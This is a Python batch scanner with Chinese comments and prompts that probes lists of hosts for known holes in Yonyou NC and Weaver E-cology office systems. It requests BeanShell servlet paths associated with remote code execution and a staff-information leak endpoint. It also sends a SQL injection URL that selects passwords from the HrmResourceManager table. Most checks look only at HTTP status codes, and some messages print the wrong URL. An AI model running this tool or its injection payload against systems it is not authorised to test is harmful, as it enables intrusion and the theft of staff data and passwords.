#!/usr/bin/python
#encoding:utf-8
import requests
print("OA系统批量漏洞检测")
print("***********************")
print("*      用友NC(1)       *")
print("*      微泛(2)         *")
print("***********************")
OA = input("请选择要检测的OA系统: ")
str(OA)
filename = input("输入文件名: ") #输入文件名
str(filename) #将文件名转化为str型
if OA == "1":
    check_file = open(filename, "r", encoding='utf-8') #读取文件
    for line in check_file.readlines():  #用for循环按行显示
        line = line.strip()  #将末尾的空行删除
        print('[+]%s'% line)  #打印fil
    print("确认是否加载正确")
    choose = input("[y/n]:")  #如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:  # 测试
                vul_url = line + "/servlet/~ic/bsh.servlet.BshServlet"
                r = requests.get(vul_url, timeout=5, verify=False).status_code
                if r == 200:
                    print("[+]可能存在Beanshell_rce漏洞: " + vul_url)
                    # noinspection PyBroadException
                    try:
                        mysqlxl_vul_url = line + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
                        r1 = requests.get(mysqlxl_vul_url, timeout=5, verify=False).status_code
                        if r1 == 200:
                            print("[+]可能存在人员信息泄露:  "+ mysqlxl_vul_url)
                        else:
                            print("[-]不存在人员信息泄露: "+mysqlxl_vul_url)
                            pass
                    except:
                        print("ERROR:无法连接: "+mysqlxl_vul_url)
                else:
                    print("[-]不存在Beanshell_rce漏洞: " + vul_url)
                    # noinspection PyBroadException
                    try:
                        mysqlxl_vul_url = line + "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
                        r1 = requests.get(mysqlxl_vul_url, timeout=5, verify=False).status_code
                        if r1 == 200:
                            print("[+]可能存在人员信息泄露:  "+ mysqlxl_vul_url)
                        else:
                            print("[-]不存在人员信息泄露: "+mysqlxl_vul_url)
                            pass
                    except:
                        print("ERROR:无法连接: "+mysqlxl_vul_url)
                    pass
            except:
                print("ERROR:无法连接:  " + vul_url)

if OA == "2":
    check_file = open(filename, "r", encoding='utf-8')  # 读取文件
    for line in check_file.readlines():  # 用for循环按行显示
        line = line.strip()  # 将末尾的空行删除
        print('[+]%s' % line)  # 打印fil
    print("确认是否加载正确")
    choose = input("[y/n]:")  # 如果是则添加exp;如果不是退出
    str(choose)
    if choose == 'y':
        print("正在探测微泛V8前台注入漏洞")
        check_file = open(filename, "r", encoding='utf-8')
        for line in check_file.readlines():
            line = line.strip()
            # noinspection PyBroadException
            try:  # 测试
                wf_vul_url = line + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
                r = requests.get(wf_vul_url, timeout=5, verify=False).status_code
                if r == 200:

                    print("[+]可能存在微泛注入漏洞: " + wf_vul_url)
                    # noinspection PyBroadException
                    try:
                        wf_vul_rce_url = line + "/weaver/bsh.servlet.BshServlet"
                        r = requests.get(wf_vul_rce_url, timeout=5, verify=False).status_code
                        if r == 200:
                            print("[+]可能存在泛微E-cologyOA 远程代码执行漏洞:  " + wf_vul_url)
                        else:
                            print("[-]不存在泛微E-cologyOA 远程代码执行漏洞: " + wf_vul_url)
                    except:
                        print("ERROR:无法连接: " + wf_vul_url)

                else:
                    print("[-]不存在微泛注入漏洞: " + wf_vul_url)
                    # noinspection PyBroadException
                    try:
                        wf_vul_rce_url = line + "/weaver/bsh.servlet.BshServlet"
                        r = requests.get(wf_vul_rce_url, timeout=5, verify=False).status_code
                        if r == 200:
                            print("[+]可能存在泛微E-cologyOA 远程代码执行漏洞:  " + wf_vul_url)
                        else:
                            print("[-]不存在泛微E-cologyOA 远程代码执行漏洞: " + wf_vul_url)
                    except:
                        print("ERROR:无法连接: " + wf_vul_url)
            except:
                print("ERROR:无法连接:  " + wf_vul_url)